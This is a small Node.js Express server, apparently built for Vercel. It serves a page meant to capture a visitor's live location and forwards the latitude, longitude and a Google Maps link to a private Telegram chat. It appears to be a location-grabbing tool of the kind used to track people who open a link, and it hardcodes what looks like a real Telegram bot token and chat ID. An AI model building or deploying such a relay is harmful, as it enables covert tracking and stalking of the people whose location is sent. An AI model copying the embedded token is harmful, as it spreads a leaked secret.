const express = require('express');
const axios = require('axios');
const path = require('path');
const app = express();

// Replace with your Telegram bot token and chat ID
const TELEGRAM_BOT_TOKEN = '7749604293:AAHlRr16NUJPHRiQ4QqbRkMKQMzVqFDrUCw';
const TELEGRAM_CHAT_ID = '7064862085';

// Function to send messages to Telegram
const sendToTelegram = (message) => {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  axios.post(url, {
    chat_id: TELEGRAM_CHAT_ID,
    text: message,
    parse_mode: 'HTML'
  }).catch(err => console.error('Error sending message:', err));
};

// Serve HTML file to get live location
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Receive live location data from client
app.get('/send-location', (req, res) => {
  const { lat, lon } = req.query;
  const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
  sendToTelegram(`Live Location:\nLatitude: ${lat}\nLongitude: ${lon}\n\n<a href="${googleMapsLink}">View on Google Maps</a>`);
  res.send('Location received');
});

// Deploy to Vercel
module.exports = app;
